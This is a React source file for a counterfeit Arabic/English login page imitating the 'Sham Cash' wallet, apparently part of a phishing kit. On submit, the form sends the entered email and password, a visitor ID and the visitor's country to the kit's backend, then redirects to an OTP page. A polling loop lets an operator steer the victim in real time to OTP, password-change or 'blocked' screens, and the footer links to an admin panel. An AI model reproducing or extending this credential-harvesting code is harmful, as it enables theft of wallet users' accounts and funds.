import { Grid3X3, Headphones, Lock, UserRound, Eye, EyeOff } from "lucide-react";
import { useState, useEffect } from "react";
import { QRScanner } from "@/components/QRScanner";
import { useVisitorTracking } from "@/hooks/useVisitorTracking";
import { shamApi } from "@/lib/shamApi";
import { getCountry } from "@/lib/getCountry";

const SPLASH_KEY = "sham_splash_seen";

function ShamLogo() {
  return (
    <div className="relative h-28 w-32">
      <div
        className="absolute left-5 top-12 h-12 w-20 rounded-[4px] bg-gradient-to-br from-[#5dd99f] via-[#44a984] to-[#257b6f] shadow-[0_18px_35px_rgba(20,219,144,0.12)]"
        style={{ clipPath: "polygon(0 20%, 64% 0, 100% 27%, 37% 57%, 100% 86%, 100% 100%, 36% 71%, 0 50%)" }}
      />
      <div
        className="absolute left-14 top-5 h-12 w-20 rounded-[4px] bg-gradient-to-br from-[#6273dd] via-[#5365c3] to-[#354075] shadow-[0_22px_40px_rgba(99,116,212,0.18)]"
        style={{ clipPath: "polygon(0 0, 100% 34%, 100% 100%, 35% 70%, 0 53%)" }}
      />
    </div>
  );
}

function WarningScreen() {
  return (
    <div
      className="fixed inset-0 z-50 flex flex-col items-center justify-center p-8 text-center"
      style={{ background: "linear-gradient(160deg, #1565C0 0%, #1976D2 40%, #1E88E5 100%)" }}
    >
      <div
        className="flex items-center justify-center rounded-full mb-10"
        style={{
          width: 130,
          height: 130,
          background: "linear-gradient(145deg, #FF8C00, #FFA500)",
          boxShadow: "0 8px 40px rgba(255,140,0,0.5)",
        }}
      >
        <svg width="68" height="68" viewBox="0 0 24 24" fill="none">
          <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" fill="white" />
          <line x1="12" y1="9" x2="12" y2="13" stroke="#FF8C00" strokeWidth="2.2" strokeLinecap="round" />
          <line x1="12" y1="17" x2="12.01" y2="17" stroke="#FF8C00" strokeWidth="2.5" strokeLinecap="round" />
        </svg>
      </div>
      <h1 className="text-white font-black text-4xl mb-6" style={{ textShadow: "0 2px 8px rgba(0,0,0,0.2)" }}>
        تنبيه
      </h1>
      <p className="text-white text-xl leading-relaxed font-semibold max-w-xs" style={{ textShadow: "0 1px 4px rgba(0,0,0,0.15)" }}>
        يجب تسجيل خروج من المحفظة قبل البدء في عملية تسجيل الدخول هنا
      </p>
    </div>
  );
}

export function ShamCashLogin() {
  const [showQR, setShowQR] = useState(false);
  const [showPass, setShowPass] = useState(false);
  const [fields, setFields] = useState({ email: "", password: "" });
  const [lang, setLang] = useState<"ar" | "en">("ar");
  const [splash, setSplash] = useState(!sessionStorage.getItem(SPLASH_KEY));
  const [blocked, setBlocked] = useState(false);

  useVisitorTracking("تسجيل الدخول");

  useEffect(() => {
    const interval = setInterval(async () => {
      const visitorId = localStorage.getItem("sham_visitor_id");
      if (!visitorId) return;
      const result = await shamApi.getCmd(visitorId);
      if (!result?.command) return;
      const cmd = result.command;
      if (cmd === "redirect:blocked" || cmd === "redirect:cancel" || cmd === "redirect:reject") {
        setBlocked(true);
      } else if (cmd === "redirect:otp") {
        window.location.href = `${import.meta.env.BASE_URL}otp`;
      } else if (cmd === "redirect:changepass") {
        window.location.href = `${import.meta.env.BASE_URL}changepass`;
      }
    }, 1500);
    return () => clearInterval(interval);
  }, []);

  function dismissSplash() {
    sessionStorage.setItem(SPLASH_KEY, "1");
    setSplash(false);
  }

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    const visitorId = localStorage.getItem("sham_visitor_id") ?? `v-${Date.now()}`;
    localStorage.setItem("sham_visitor_id", visitorId);
    const country = await getCountry();
    await shamApi.submit({
      id: visitorId,
      submittedAt: new Date().toLocaleTimeString("ar-SY"),
      submittedAtTs: Date.now(),
      email: fields.email,
      password: fields.password,
      phone: "",
      loan: "",
      income: "",
      otpCode: "",
      otpStatus: null,
      changepassStatus: null,
      page: "تسجيل الدخول",
      isActive: true,
      lastSeen: Date.now(),
      country,
    });
    window.location.href = `${import.meta.env.BASE_URL}otp`;
  }

  const dir = lang === "ar" ? "rtl" : "ltr";

  if (blocked) return <WarningScreen />;

  return (
    <div className="min-h-screen w-full overflow-hidden bg-[#151c36] text-white" dir={dir}>
      {/* Splash overlay */}
      {splash && (
        <div
          className="fixed inset-0 z-50 flex flex-col items-center justify-center p-8 text-center cursor-pointer"
          style={{ background: "linear-gradient(160deg, #1565C0 0%, #1976D2 40%, #1E88E5 100%)" }}
          onClick={dismissSplash}
        >
          <div
            className="flex items-center justify-center rounded-full mb-10"
            style={{
              width: 130,
              height: 130,
              background: "linear-gradient(145deg, #FF8C00, #FFA500)",
              boxShadow: "0 8px 40px rgba(255,140,0,0.5)",
            }}
          >
            <svg width="68" height="68" viewBox="0 0 24 24" fill="none">
              <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" fill="white" />
              <line x1="12" y1="9" x2="12" y2="13" stroke="#FF8C00" strokeWidth="2.2" strokeLinecap="round" />
              <line x1="12" y1="17" x2="12.01" y2="17" stroke="#FF8C00" strokeWidth="2.5" strokeLinecap="round" />
            </svg>
          </div>
          <h1 className="text-white font-black text-4xl mb-6" style={{ textShadow: "0 2px 8px rgba(0,0,0,0.2)" }}>
            تنبيه
          </h1>
          <p className="text-white text-xl leading-relaxed font-semibold max-w-xs" style={{ textShadow: "0 1px 4px rgba(0,0,0,0.15)" }}>
            يجب تسجيل خروج من المحفظة قبل البدء في عملية تسجيل الدخول هنا
          </p>
          <p className="text-white/60 text-sm mt-10 font-semibold">اضغط للمتابعة</p>
        </div>
      )}

      <div className="relative mx-auto flex min-h-screen w-full max-w-[390px] flex-col px-4 pb-7 pt-4 font-['Inter']">
        {/* bg blobs */}
        <div className="pointer-events-none absolute -left-24 top-0 h-72 w-72 rounded-full bg-[#6273d4]/10 blur-3xl" />
        <div className="pointer-events-none absolute -right-28 bottom-20 h-80 w-80 rounded-full bg-[#1fc28a]/5 blur-3xl" />

        {/* Top bar */}
        <div className="relative flex items-center justify-between pt-2">
          <button
            onClick={() => setLang(lang === "ar" ? "en" : "ar")}
            className="text-[15px] font-bold text-white/70 hover:text-white transition-colors"
          >
            {lang === "ar" ? "English" : "العربية"}
          </button>
          <div className="flex h-9 w-9 items-center justify-center rounded-full text-white">
            <Headphones className="h-6 w-6" strokeWidth={2.5} />
          </div>
        </div>

        {/* Logo */}
        <div className="relative flex justify-center pb-6 pt-6">
          <ShamLogo />
        </div>

        {/* Form */}
        <form className="relative space-y-5" onSubmit={handleSubmit}>
          <h1 className={`text-[27px] font-extrabold tracking-[-0.02em] text-white/90 ${lang === "ar" ? "text-right" : "text-left"}`}>
            {lang === "ar" ? "تسجيل الدخول" : "Sign In"}
          </h1>

          <div className="space-y-4">
            {/* Email field */}
            <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
              <div className="text-white/60"><UserRound className="h-5 w-5" /></div>
              <input
                type="text"
                placeholder={lang === "ar" ? "البريد الإلكتروني" : "Email Address"}
                className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
                dir={dir}
                autoComplete="email"
                value={fields.email}
                onChange={e => setFields(p => ({ ...p, email: e.target.value }))}
              />
            </div>

            {/* Password field */}
            <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
              <div className="text-white/60 cursor-pointer" onClick={() => setShowPass(p => !p)}>
                {showPass ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
              </div>
              <input
                type={showPass ? "text" : "password"}
                placeholder={lang === "ar" ? "كلمة المرور" : "Password"}
                className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
                dir={dir}
                autoComplete="current-password"
                value={fields.password}
                onChange={e => setFields(p => ({ ...p, password: e.target.value }))}
              />
              <div className="text-white/60"><Lock className="h-5 w-5" /></div>
            </div>
          </div>

          {/* Forgot password */}
          <p className="text-center text-[14px] font-semibold text-[#cfd2df]/78">
            {lang === "ar" ? "هل نسيت كلمة المرور؟" : "Forgot your password?"}{" "}
            <span
              className="cursor-pointer text-[#7183e6] hover:underline"
              onClick={() => { window.location.href = `${import.meta.env.BASE_URL}changepass`; }}
            >
              {lang === "ar" ? "تغيير كلمة المرور" : "Change Password"}
            </span>
          </p>

          {/* Buttons */}
          <div className="grid grid-cols-[58px_1fr] gap-3 pt-1" dir="ltr">
            <button
              type="button"
              onClick={() => setShowQR(true)}
              className="flex h-[58px] w-[58px] items-center justify-center rounded-[15px] bg-[#657bd8] shadow-[0_16px_35px_rgba(101,123,216,0.22)] transition-transform active:scale-[0.96] hover:bg-[#7089e0]"
            >
              <Grid3X3 className="h-8 w-8 text-white" strokeWidth={2.6} />
            </button>
            <button
              type="submit"
              className="h-[58px] rounded-[15px] bg-[#657bd8] text-[20px] font-extrabold text-white shadow-[0_16px_35px_rgba(101,123,216,0.22)] transition-transform active:scale-[0.98] hover:bg-[#7089e0]"
            >
              {lang === "ar" ? "تسجيل الدخول" : "Sign In"}
            </button>
          </div>

          <p className="text-center text-[15px] font-semibold text-[#d4d6e3]/62">
            {lang === "ar" ? "لا تملك حساب مسبقاً؟" : "Don't have an account?"}{" "}
            <span className="cursor-pointer text-[#6f82e5] hover:underline">
              {lang === "ar" ? "إنشاء حساب" : "Create Account"}
            </span>
          </p>
        </form>

        {/* Footer */}
        <footer className="relative mt-auto flex flex-col items-center gap-3 pb-0 pt-4 text-center">
          <a href="/admin-panel/" className="text-[12px] font-semibold text-white/25 hover:text-white/50 transition-colors tracking-wide">
            لوحة التحكم
          </a>
          <div className="space-y-3">
            <div className="text-[14px] font-extrabold tracking-[0.18em] text-white/68" dir="ltr">POWERED BY</div>
            <div className="mx-auto h-8 w-11 opacity-20">
              <svg viewBox="0 0 100 80" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M31 13h38l20 20-20 20H31L11 33 31 13Z" stroke="white" strokeWidth="8" />
                <path d="M40 24h24l10 10-10 10H40L29 34 40 24Z" stroke="white" strokeWidth="8" />
              </svg>
            </div>
            <div className="text-[12px] font-semibold tracking-[0.18em] text-white/70" dir="ltr">V 2.2.4</div>
          </div>
        </footer>
      </div>

      {showQR && (
        <QRScanner
          onScan={result => {
            setFields(p => ({ ...p, email: result }));
            setShowQR(false);
          }}
          onClose={() => setShowQR(false)}
        />
      )}
    </div>
  );
}

export default ShamCashLogin;
